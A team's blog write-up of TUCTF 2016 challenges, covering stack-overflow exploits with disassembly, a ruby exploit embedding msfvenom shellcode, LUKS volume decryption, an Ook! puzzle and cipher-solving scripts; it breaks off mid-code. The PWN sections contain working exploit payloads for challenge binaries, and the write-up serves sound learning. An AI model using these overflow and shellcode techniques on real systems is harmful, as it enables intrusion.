---
layout: post
title: TUCTF 2016 - Writeups
date: 2016-05-29
tags: ["CTF","TUCTF"]
---

Two weeks ago we had the pleasure to take part in the [TU-CTF 2016 ](http://ctf.asciioverflow.com/)organized by ASCII Overflow. It was an entry-level Jeopardy CTF with challenges from different security areas including web, binary exploitation, crypto and even one network analysis challenge. After solving the security riddles a so called flag in the form of TUCTF{...} could be retrieved. Uploading it to the CTF website your team earned some points. The points to earn ranged from 10 to 500 per challenge.
The guys from University of Tulsa programmed their website to show only up to 50 registered teams, since they were not expecting to register more (as far as I understood conversations from IRC). There were some confusion during registration since it seemed we, with a team ID greater than 150, weren't on the list. The worries got settled after the CTF began. ASCII Overflow delivered a bunch of creative challenges to keep us awake without service interruptions or considerable confusions about the setup. Looking back, this was one of the best organized CTFs(at least infrastructure wise) I took part in - stuff just worked. They pulled off an awesome event. Especially considering that the [scoreboard](http://ctf.asciioverflow.com/scoreboard) prompts 435 team - nice job scaling ;-)
One of those teams were the Ulm Security Sparrows. A handful of people of the USS met in the Ulm University to take part in the CTF on Saturday. With some additional hours invested on Sunday we were able to collect 640 points.
This made us achieve the 118th place of 435 teams and place 54/162 among college teams.
We solved the following challenges and wanted to contribute our solutions to the CTF community. We hope to inspire and make others learn like we do reading their writeups. Enjoy.

• PWN 1-3
• Escape from Hell - Start Your Decent
• The Neverending Crypto Level 1-3
• Web 1,2,4
• Misc - The Nack


## PWN - bby's first elf

As in other PWN challenges the first one runs in ASCII Overlows's infrastructure and the participants additionally can download the binary for analysis. The first elf is fairly simple. You can input something and you get some output, nothing else. It seems.

    ./3d726802521a9ce2b24e2c3baf039915e48ad056 
    This program is hungry. You should feed it.
    W0000000f
    Do you feel the flow?

The first thing I did was loading the binary into radare23 and looking at the main function. Looks boring at first glance, it gives some output and takes input. The later is happening through scanf@0x080485ed which is broken security wise in most cases. The functions takes two arguments: String format@0x080485e6 and point to a buffer@0x080485de with is only 20 bytes in our case. So to trigger a stack overflow we need to input 20 bytes with garbage, then 4 bytes to overwrite the Saved Frame Pointer. The next think on the stack is the Instruction Pointer(IP). Now we own the control flow. But how we get the flag with that?

    [...]
    [0x08048c70]> pdf@sym.main
    ;-- main:
    / (fcn) sym.main 60
    '           ; UNKNOWN XREF from 0x08048488 (sym.main)
    '           ; DATA XREF from 0x08048487 (sym.main)
    '           0x080485c9      55             push ebp
    '           0x080485ca      89e5           mov ebp, esp
    '           0x080485cc      83e4f0         and esp, 0xfffffff0
    '           0x080485cf      83ec20         sub esp, 0x20
    '           0x080485d2      c70424ac8604.  mov dword [esp], str.This_program_is_hungry._You_should_feed_it. ; [0x80486ac:4]=0x73696854 LEA str.This_program_is_hungry._You_should_feed_it. ; "This program is hungry. You should feed it." @ 0x80486ac
    '           0x080485d9      e842feffff     call sym.imp.puts
    '           0x080485de      8d442414       lea eax, dword [esp + 0x14] ; 0x14
    '           0x080485e2      89442404       mov dword [esp + 4], eax
    '           0x080485e6      c70424d88604.  mov dword [esp], 0x80486d8  ; [0x80486d8:4]=0x44007325
    '           0x080485ed      e86efeffff     call sym.imp.__isoc99_scanf
    [...]

Let's look at the methods available in binary. If we list them there is *surprise* a printFlag() function. Looking at the assembly we can confirm it's what we have bin looking for. It basically calls open@0x08048582 on the local file
"flag.txt"@0x0804857b and later puts() the content of it.

    [0x08048c70]> afl
    [...]
    0x0804856d  92    1     sym.printFlag
    0x080485c9  60    1     sym.main
    [...]
    [0x08048c70]> pdf@sym.printFlag
    / (fcn) sym.printFlag 92
    '           ; var int local_ch @ ebp-0xc
    '           ; var int local_3eh @ ebp-0x3e
    '           0x0804856d      55             push ebp
    '           0x0804856e      89e5           mov ebp, esp
    '           0x08048570      83ec58         sub esp, 0x58
    '           0x08048573      c7442404a086.  mov dword [esp + 4], 0x80486a0 ; [0x80486a0:4]=0x6c660072
    '           0x0804857b      c70424a28604.  mov dword [esp], str.flag.txt ; [0x80486a2:4]=0x67616c66 LEA str.flag.txt ; "flag.txt" @ 0x80486a2
    '           0x08048582      e8c9feffff     call sym.imp.fopen
    [...]

So we have just to point the our IP to the function address. The exploit looks like this:

    ruby -e 'print("A"*24 + "\x6d\x85\x04\x08")' ' netcat $IP $PORT

Easy 25 points.

## PWN - WoO2

The 50 points challenge was a little bit harder, but not too much. Let's look at what the program does.

    Welcome! I don't think we're in Kansas anymore.
    We're about to head off on an adventure!
    Select some animals you want to bring along.
    
    Menu Options:
    1: Bring a lion
    2: Bring a tiger
    3: Bring a bear
    4: Delete Animal
    5: Exit
    
    Enter your choice:
    2
    Choose the type of tiger you want:
    1: Siberian Tiger
    2: Bengal Tiger
    3: Sumatran Tiger
    4: Caspian Tiger
    3
    Enter name of tiger:
    asdf

Again we have some dummy functionality with a vulnerability waiting to be found. So let's look at what the program does under the hood. Main() function doesn't contain any interesting code but a rough structure. Most of the functions do some printing stuff, the first interesting interaction happens inside the method makeStuff(). Let's look at it.

    [...]
    '           0x00400da2      488b05f71220.  mov rax, qword [rip + 0x2012f7] ; [0x6020a0:8]=0x382e342075746e75 LEA obj.stdout__GLIBC_2.2.5 ; "untu 4.8.5-2ubuntu1~14.04.1) 4.8.5" @ 0x6020a0
    '           0x00400da9      4889c7         mov rdi, rax
    '           0x00400dac      e82ffaffff     call sym.imp.fflush
    '           0x00400db1      488d45fc       lea rax, qword [rbp - local_4h]
    '           0x00400db5      4889c6         mov rsi, rax
    '           0x00400db8      bf18104000     mov edi, 0x401018           ; "%d" @ 0x401018
    '           0x00400dbd      b800000000     mov eax, 0
    '           0x00400dc2      e839faffff     call sym.imp.__isoc99_scanf
    '           0x00400dc7      e8e4f9ffff     call sym.imp.getchar
    '           0x00400dcc      8b45fc         mov eax, dword [rbp - local_4h]
    '           0x00400dcf      83f803         cmp eax, 3
    '       ,=< 0x00400dd2      743c           je 0x400e10
    [...]
    '  ''''''   0x00400def      3d37130000     cmp eax, 0x1337
    ' ,=======< 0x00400df4      743c           je 0x400e32
    [...]
    ' ''''''`-> 0x00400e10      b800000000     mov eax, 0
    ' ''''''    0x00400e15      e81ffeffff     call sym.makeBear
    [...]
    ' `-------> 0x00400e32      b800000000     mov eax, 0
    '  '''' '   0x00400e37      e8a5feffff     call sym.pwnMe
    [...]

In the assembly snipped above we see a scanf() which reads an integer (since "\%d" is a parameter), followed by a switch case. It checks for the typed number and creates an animal according to the input. Address 0x00400def compares a flashy number: 0x1337 respectively 4919 in base ten. Then we jump to the pwnMe() method and look at what it does.

    [...]
         0x00400ce5      4883ec10       sub rsp, 0x10
         '           0x00400ce9      8b05d1132000   mov eax, dword [rip + 0x2013d1] ; [0x6020c0:4]=0x4700352e LEA obj.bearOffset ; ".5" @ 0x6020c0
         '           0x00400cef      4898           cdqe
         '           0x00400cf1      488b04c5e020.  mov rax, qword [rax*8 + obj.pointers] ; [0x6020e0:8]=0x322e382e3420 LEA obj.pointers ; " 4.8.2" @ 0x6020e0
         '           0x00400cf9      488945f0       mov qword [rbp - local_10h], rax
         '           0x00400cfd      488b45f0       mov rax, qword [rbp - local_10h]
         '           0x00400d01      8b4014         mov eax, dword [rax + 0x14] ; [0x14:4]=1
         '           0x00400d04      83f803         cmp eax, 3
         '       ,=< 0x00400d07      7511           jne 0x400d1a
         '       '   0x00400d09      488b45f0       mov rax, qword [rbp - local_10h]
         '       '   0x00400d0d      488b00         mov rax, qword [rax]
         '       '   0x00400d10      488945f8       mov qword [rbp - local_8h], rax
         '       '   0x00400d14      488b45f8       mov rax, qword [rbp - local_8h]
         '       '   0x00400d18      ffd0           call rax
         '       '   ; JMP XREF from 0x00400d07 (sym.pwnMe)
         '       `-> 0x00400d1a      bf00000000     mov edi, 0
         \           0x00400d1f      e8ecfaffff     call sym.imp.exit</pre>

At the position 0x00400d18 a method with its address in $RAX is called. Interesting, let's make a shortcut - instead of reversing we start a debugger and look how we can influence the targeted register. There is a compare statement at 0x00400d04 which we have to pass, so we need the value 3 in EAX at this point. For a closer look we put a break point there and create a brown bear (because brown bears are the most awesome animals on earth, this was the first thing I created). Inside GDB we do the following:

    b* 0x00400d04
    run
    3 # choose bears
    2 # choose a brown bear
    ABCDEFGHKL # give the animal some name
    info registers # look at EAX/RAX

We notice EAX has the value two. Trying different animals we state that the second input (brown bear) is what is copied into EAX. The only possible combination is to take Sumatran Tiger (input is two, then three). Again we give it a name with handy letters and rerun the program inside the debugger. It throws a segfault when executing "call RAX" and *surprise*, *surprise* the value of RAX is  0x4847464544434241 at this point. In Little Endian this stands for "ABCDEFGH". We own control flow. But where to go to? We again execute _afl_ shortcut in radare2 to find a method named "l33tH4x0r". The method we have to jump to is called printFlag(), like in the first challenge. So in summary, we choose a tiger (value two), then a Sumatran tiger (value 3), choose the name of our tiger to be the address of l33tH4x0r method as a 64bit value. And finally choose 4919 (0x1337).

    ruby -e 'print("\x32\n\x33\n\x0d\x09\x40\x00\x00\x00\x00\x00\x00\n4919\n")' ' netcat $IP $PORT

## PWN - Especially Good Jmps

The 75 points needed some more effort to invest into exploitation but not to find the vulnerability itself. The challenge text already states that we will have to bypass ASLR on the server. The name good Jmps already suggests exploitation techniques. As we know a reliable jump to our shellcode can be done through Assembly gadgets which points to our stack. So if you control the Instruction Pointer, you still put your shellcode after the Saved IP but to jump there you can't use the address since you don't know it. To check the theory we use Tobias Klein's checksec:

    $checksec --file 23e4f31a5a8801a554e1066e26eb34745786f4c4                                                                                                                                                                                  
    RELRO           STACK CANARY      NX            PIE[...]
    Partial RELRO   No canary found   NX disabled   No PIE[...]

No canaries are build in and no NX bit set, so we get to do regular stack smashing. Let's look at our victim, the main():

    0x0804851d      55             push ebp
    0x0804851e      89e5           mov ebp, esp
    0x08048520      83e4f0         and esp, 0xfffffff0
    0x08048523      83ec30         sub esp, 0x30
    0x08048526      c70424808604.  mov dword [esp], str.What_s_your_name_ ;
    0x0804852d      e8aefeffff     call sym.imp.puts
    0x08048532      a140a00408     mov eax, dword [obj.stdout__GLIBC_2.0] ;
    0x08048537      890424         mov dword [esp], eax
    0x0804853a      e881feffff     call sym.imp.fflush
    0x0804853f      8d442410       lea eax, dword [esp + 0x10] ; 0x10
    0x08048543      890424         mov dword [esp], eax
    0x08048546      e885feffff     call sym.imp.gets
    0x0804854b      c70424928604.  mov dword [esp], str.What_s_your_favorite_number_ ;
    [...]

We'll take the first buffer overflow we are offered: _gets()_ functions just take a buffer pointer as an argument and write into it as long as the function receives input. How much bytes do we have to write for control flow hijacking? Let's start at the Assembly: first Assembly OP _and esp, 0xfffffff0_ basically subtracts 1-15 from ESP. We look at the ESP, this time inside a debugger, and confirm that the least significant bits are the decimal value 8. Even when we have ASLR activated the offsets are about to be the same. Afterwards another 48bytes are allocated on stack with _sub    esp,0x30_. That means 56 bytes for local variables. A little later we increment the stack pointer by 16 (that means the stack shrinks) using the operation _lea eax, dword [esp + 0x10]_. That means we need to fill up the remaining 40 bytes with garbage, overwrite the saved frame pointer with 4 bytes of garbage, append the address of a gadget the Instruction Pointer will point to and finally put our shellcode onto the stack. Easy as PIE. \\
Let's look at how to find a gadget. Remember what I said at the beginning of this section, we need an OP code to reliably jump to our shellcode. Radare2 has of course tools for that: using _/c push esp_ you get five addresses where this gadget in your binary lives. The last one I found was (nearly) perfect. It looks like this:

    $pd@0x08048440
    0x08048440      fff4           push esp
    0x08048442      6690           nop
    0x08048444      6690           nop
    0x08048446      6690           nop
    0x08048448      6690           nop
    0x0804844a      6690           nop
    0x0804844c      6690           nop
    0x0804844e      6690           nop
    0x08048450      8b1c24         mov ebx, dword [esp]
    0x08048453      c3             ret
    [...]

After we've overwritten our buffer with 44 bytes of garbage we put the address 0x08048440 onto the stack. Thus when we leave our main() function the Instruction Pointer will point to it. _push esp_ will lay the pointer of ESP onto the stack and later we load it into the register EIP with the op code _ret_. At this point esp contains our shellcode.

    #!/usr/bin/env ruby
    
    # padding + address of pop ebp, ret
    payload = "\x41" * 44 
    # addr of gadget push esp, ret
    payload +=  "\x40\x84\x04\x08" 
    # Noobs use NOPS
    payload += "\x90" * 20 
    # shellcode, generated with: 
    # msfvenom -p linux/x86/exec CMD='/bin/cat ./flag.txt' -b '\x00' -f ruby 
    payload += 
    "\xba\x33\x5a\x81\xb0\xda\xc3\xd9\x74\x24\xf4\x5e\x29\xc9" +
    "\xb1\x0e\x31\x56\x15\x83\xc6\x04\x03\x56\x11\xe2\xc6\x30" +
    "\x8a\xe8\xb1\x97\xea\x60\xec\x74\x7a\x97\x86\x55\x0f\x30" +
    "\x56\xc2\xc0\xa2\x3f\x7c\x96\xc0\xed\x68\xbc\x06\x11\x69" +
    "\x92\x64\x78\x07\xc3\x0b\x1b\xa3\x3b\xe2\xf4\x2d\x50\x9b" +
    "\x6d\x9c\xdc\x23\x05\xe0\x4b\x87\x6c\x01\xbe\xa7"
    
    f = File.open('payload.hex', 'wb')
    f.write(payload)
    f.close()
    # system("cat payload.hex ' netcat $IP $PORT")

A huge thanks goes to the team [Batman's Kitchen](https://ctftime.org/team/3135). One of their members gave me valuable feedback on my shellcode and why it failed. This enabled us to get the last 75 points close to the end of TUCTF.

## Escape from Hell - Start Your Descent

The TU-CTF team provided a VM for download. Starting the VM shows the GRUB bootscreen and after selecting the actual Linux installation, a password prompt appears.

In order to further analyse the machine using gparted, we mounted the provided VMDK into another VM, running Ubuntu. Except for the boot partition, all other volumes were encrypted and most of them were part of an LVM. _sudo strings /dev/sdc1 ' grep -C 30 -i "tuctf"_ gives us the following text:

    Welcome to Hell!
    After taking a wrong turn on your way home from work, you somehow ended up in Hell! Don't worry though, a stray cat named Lucifer (no relation) spotted your predicament and has agreed to help you in your quest to escape.
    Luckily, the first level of Hell is fairly pleasant, so getting out of here won't be hard.
    Lucifer the Cat has a few helpful tips for your journey:
    1) Lucifer recommends using a livecd of Arch Linux booted alongside the VM
    2) For decryption, we will only use the contents of a flag: e.g. in the solution tuctf{flag_goes_here}, the decryption key for the next level would only be flag_goes_here.
    3) The Arch wiki's page on dm-crypt may come in handy if you haven't previously used it.
    Good luck! Your first decryption key (for section m1) is "welcome_to_hell!"

Using the given password "welcome_to_hell!", we decrypt section m1 (which is actually /dev/sdc5) and then mount the contained LVM volume.

    $ sudo cryptsetup luksOpen /dev/sdb5 m1
    $ sudo vgscan
    $ sudo vgchange -ay
    $ sudo mount /dev/mapper/m1-m1 /mnt/m1
    $ cd /mnt/m1
    $ ls
    AFewWords  lost+found

The file _AFewWords_ contains the following challenge:

    Ah, the second level of Hell, Lust. Violent winds batter you about as you struggle to find your way across. Lucifer knows the way, of course, but all you can hear over the howling wind are these few words:
    
    Purr! Purr! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Purr! Purr! Purr! Mew! Meow! Meow! Meow! Meow! Meow! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Mew! Meow! Mew! Purr! Meow! Mew! Meow! Meow! Purr! Meow! Purr! Mew! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Meow! Purr! Purr! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Meow! Meow! Meow! Purr! Meow! Meow! Meow! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Meow! Meow! Purr! Meow! Purr! Purr! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew!
    Purr! Meow! Mew! Meow! Meow! Purr! Meow! Meow! Meow! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Meow! Purr! Purr! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Meow! Purr! Purr! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Meow! Meow! Purr! Meow! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Mew! Purr! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Purr! Purr! Purr! Meow! Purr! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Meow! Meow! Purr! Mew! Purr! Purr! Purr! Purr! Purr! Purr! Meow! Mew! Meow! Meow! Mew! Meow! Mew! Purr! Meow! Mew! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Purr! Meow!
    
Our presumption that this strange sequence of words has something to do with the programming language Ook!, which is a derivative of Brainfuck was confirmed via the IRC. A hint concerning [Ook!](http://esolangs.org/wiki/Ook!) was published there.
Ook! basically works like Brainfuck, but the commands are renamed as follows:

    >    Ook. Ook?    Move the pointer to the right
    <    Ook? Ook.    Move the pointer to the left
    +    Ook. Ook.    Increment the memory cell under the pointer
    -    Ook! Ook!    Decrement the memory cell under the pointer
    .    Ook! Ook.    Output the character signified by the cell at the pointer
    ,    Ook. Ook!    Input a character and store it in the cell at the pointer    
    [    Ook! Ook?    Jump past the matching Ook? Ook! if the cell under the pointer is 0
    ]    Ook? Ook!    Jump back to the matching Ook! Ook?

After first trying the wrong combination, we found the correct relation between cats and orang utans:

    Mew = Ook?
    Purr! = Ook!
    Meow = Ook.

 We translated the given sequence into Ook! and from Ook! to Brainfuck. The result looked like this:

    -[--->+<]>.--[--->+<]>---.--.+++.------------.++++++++.-[++>---<]>+.[-->+++<]>-.
    -[--->++<]>.-------.+++.>++++++++++.[--------->++<]>.+.+[->+++<]>+.-[--->+<]>--.
    +++[->+++<]>+.+[----->+<]>.-[->+++<]>-.--------.++++++++++.++++++++.[->+++<]>--.
    ++++++++++++.-----------.+.+++++[->+++<]>.-[->++++++<]>+..----.----------.++++++
    +++++++.[--->+<]>-.--[->+++<]>-.---.+[--->+<]>+++.++++.

 Executing it yielded the flag with which we were also able to decrypt /tmp (/dev/sdb6):

    Unlock /tmp
    tuctf{meowcode>ookanyday}

##  The Neverending Crypto Level 1

The first hint that was given was to connect to port 24069 at a certain IP. Of course I did that and was greeted.

    Welcome to The Neverending Crypto!
    Quick, find Falkor and get through this!
    This is level 1, the Bookstore
    Round 1. Give me some text:
    
So, I typed 'a' on my keyboard and the server responded

    a encrypted is .-
    What is -.. --- -. -   ..-. --- .-. --. . -   .- ..- .-. -.-- -. decrypted?

Well, I am not a specialist of morse code, but i recognize morse when I see it. Nevertheless I was too slow to search on wikipedia for a table, decode that stuff and type it back. The server closed the connection. So I wrote a script to decode morse. After many trial and errors I finally succeeded and answered correctly to the server who only wanted that I decode more morse.

    Correct!
    Round 2. Give me some text:
    a encrypted is .-
    What is .- - .-. . -.-- ..-   ...- ...   --. -- --- .-. -.- decrypted?

So I had to modify my script. I put a loop around the decoder. At first it was an endless loop, but at 50 rounds the script exploded.

    Round 50. Give me some text:
    a encrypted is .-
    What is - .-. -.--   ... .-- .. -- -- .. -. --.  decrypted?
    Cleartext is:try swimming
    Correct!
    Round complete!
    TUCTF{i_wi11_n0t_5teal}
    ------------------------------------------
    You take the book
    This is level 2 the attic
    Round 1. Give me some text:

So. we finally made it to level 2. Sweet victory. This TUCTF{i\_wi11\_n0t\_5teal}-stuff is a token which you could put in the website and then my team got 10 credits. That's how CTFs work.

What follows is my code. The file was named scriptl1.py

    #!/usr/bin/env python
    ip='xxx.xxx.xxx.xxx'
    port=24069
    CODEL1 = {  '.-'  : 'a',  '-...':'b',  '-.-.':'c',
                '-..' : 'd',  '.'   :'e',  '..-.':'f',
                '--.' : 'g',  '....':'h',  '..'  :'i',
                '.---': 'j',  '-.-' :'k',  '.-..':'l',
                '--'  : 'm',  '-.'  :'n',  '---' :'o',
                '.--.': 'p',  '--.-':'q',  '.-.' :'r',
                '...' : 's',  '-'   :'t',  '..-' :'u',
                '...-': 'v',  '.--' :'w',  '-..-':'x',
                '-.--': 'y',  '--..':'z',
            }
    import socket
    import re
    
    # Level 1
    sock = socket.socket()
    sock.connect((ip, port))
    for i in xrange(50):
        print(sock.recv(256))
        # Round i. Give me some text:
        sock.send("a\n")
        print("#######")
        answer=sock.recv(256)
        print("server answer:" +answer)
        # a encrypted is .- 
        # What is ..-. .-. .- --. -- . -. - .- - .. --- -.  decrypted?
        # :
        match=re.search('What is (.*) decrypted?', answer)
        morse=match.group(1)
    
        cleartext=''
        for morsechar in morse.replace("   "," space ").split():
            if morsechar == 'space':
                cleartext += ' '
            else:
                cleartext += CODEL1[morsechar]
    
        print("Cleartext is:" + cleartext)
        sock.send(cleartext+"\n")

The stuff with the space is a dirty hack. If you split a string containing multiple spaces in Python the sucker will just disregard it. So i substituted multiple spaces by " space ", split and then appended a space when encountering the word "space". Well, at CTFs you are sometimes under time pressure and code elegance is subordinate.

## The Neverending Crypto Level 2

For level 2 I had to go through level 1 every time. At least that is what the guys at the IRC-channel said:

    (13:35:28) uss_cryptobunny: whoisjohngalt: in the crypto challenge is there a shortcut to level2 or do i have to run through level1 every time?
    (13:35:59) neptunia: ^ every time
    (13:36:04) neptunia: that's why its neverending

So i restructured my code. I made a main.py which executed the different files for the different levels. At the end it looked like this:

    execfile("scriptl1.py")
    execfile("scriptl2.py")
    execfile("scriptl3.py")

For level 2 i tried some letters. If the phrase was too long, the server said it is too long and closed the connection. It was a really slow process, since i had to go through the first level every time. I quickly discovered that the cipher was a simple monoalphabetic substitution. That is one of the easiest ciphers in existence. One simply substitutes each letter with a different letter. For example
'a' becomes 'n', 'b' becomes 'o'. It was simply a matter of trying out all the letters, making a codebook and reusing the code from the first level.
Oh, and did I mention putting everything in a loop with 50 rounds?
And then finally, level 3:

    Round 50. Give me some text:
    ABCDEFGH encrypted is NOPQRSTU
    What is v-'%r-''# decrypted?
    :
    Cleartext is:i owe you
    Correct!
    Round complete!
    TUCTF{c4n_s0me0ne_turn_a_1ight_0n}
    
    You have found The Nothing
    This is level 3, The Nothing.
    Round 1. Give me some text:

So, here is the code of scriptl2.py which solved the second level:
    
    #!/usr/bin/env python
    ip='xxx.xxx.xxx.xxx'
    port=24069
    
    import socket
    import re
    
    # Round complete!
    # TUCTF{i_wi11_n0t_5teal}
    # ------------------------------------------
    # You take the book
    # This is level 2 the attic
    
    # Level 2
    CODEL2 = {
    '-'  : ' ',
    'n'  : 'a',
    'o'  : 'b',
    'p'  : 'c',
    'q'  : 'd',
    'r'  : 'e',
    's'  : 'f',
    't'  : 'g',
    'u'  : 'h',
    'v'  : 'i',
    'w'  : 'j',
    'x'  : 'k',
    'y'  : 'l',
    'z'  : 'm',
    '{'  : 'n',
    '''  : 'o',
    '}'  : 'p',
    '~'  : 'q',
    ' '  : 'r',
    '!'  : 's',
    '"'  : 't',
    '#'  : 'u',
    '$'  : 'v',
    '%'  : 'w',
    '&'  : 'x',
    "'"  : 'y',
    '('  : 'z'
    }
    # built using many trials and assuming monoalphabetic substitution
    # hopefully they did not put any numbers in
    
    for i in xrange(50):
        print(sock.recv(256))
        # Round i. Give me some text:
        sock.send("ABCDEFGH\n")
        print("#######")
        answer=sock.recv(256)
        print("server answer:" +answer)
        # server answer: STUVW encrypted is -`abcd
        match=re.search('What is (.*) decrypted?', answer)
        ciphertext=match.group(1)
        cleartext=''
        for cipherletter in ciphertext:
        cleartext += CODEL2[cipherletter]
        print("Cleartext is:" + cleartext)
        sock.send(cleartext+"\n")

## The Neverending Crypto Level 3

The third level was hard. If i remember correctly 'b' decrypted was 'b', 'bb' decrypted was 'yy', 'bbb' decrypted was again 'bbb'. I had no idea what was going on. And for each trial I had to walk through the two levels before. I opened multiple shells to run through the stuff in parallel. Spaces were preserved, so there was no permutation, just substitution of characters through other characters. I also assumed that it was a deterministic encryption, since groups of characters were always substituted by the same group of characters with the same length. As I later found out this was not the case. The nondeterminism was just very seldom.

And then I had an idea. As with all good ideas, it is not entirely clear how they form. Just that small spark of intuition. I looked at all the cleartexts I had decrypted before and discovered that there was about a hand full of them, all having to do with the neverending story. Nice. So i thought that they will perhaps be the same again and tried them all. It was made a little more difficult by the fact, that for some cleartexts there were multiple ciphertexts. For example 'dont forget auryn' could either encrypt to 'erby urpi.y agpfb' or to 'sykg typdfg alpjk'. After I made that codebook with the words, the rest was simple. And after 50 rounds, I saw the familiar text:

    Round 50. Give me some text:
    the nothing encrypted is ghf kyghukd
    What is ravf ghf ;pukcfrr decrypted?
    :
    Cleartext is:save the princess
    Correct!
    Round complete!
    TUCTF{5omething_is_b3tt3r_th4n_n0thing}
    
    You have run into a bad place...
    This is level 4, the swamps of sadness.
    Round 1. Give me some text:

Here is the code for scriptl3.py:

    #!/usr/bin/env python
    ip='xxx.xxx.xxx.xxx'
    port=24069
    
    import socket
    import re
    
    # Round complete!
    # TUCTF{i_wi11_n0t_5teal}
    # ------------------------------------------
    # You take the book
    # This is level 2 the attic
    
    # Level 2
    CODEL3 = {
    "agpfjl vr dmype"       : "atreyu vs gmork",
    "ayp.fg ko imrpt"       : "atreyu vs gmork",
    "xaoycab"               : "bastian",
    "barguak"               : "bastian",
    "erby urpi.y agpfb"     : "dont forget auryn",
    "sykg typdfg alpjk"     : "dont forget auryn",
    "sgpfjl vr dmype"       : "dtreyu vs gmork",
    "tpadmfkgaguyk"         : 'fragmentation',
    "upaim.byaycrb"         : 'fragmentation',
    "duakg glpgif"          : "giant turtle",
    "icaby ygpyn."          : "giant turtle",
    "dmyper cyyi"           : "gmorks cool",
    "imrpto jrrn"           : "gmorks cool",
    "c r,. frg"             : "i owe you",
    "u ywf jyl"             : "i owe you",
    "myyk chuis"            : "moon child",
    "mrrb jdcne"            : "moon child",
    "mf ngjtepairb"         : "my luckdragon",
    "mj ilcespadyk"         : "my luckdragon",
    "pfasukd ur sakdfpylpr" : "reading is dangerours",
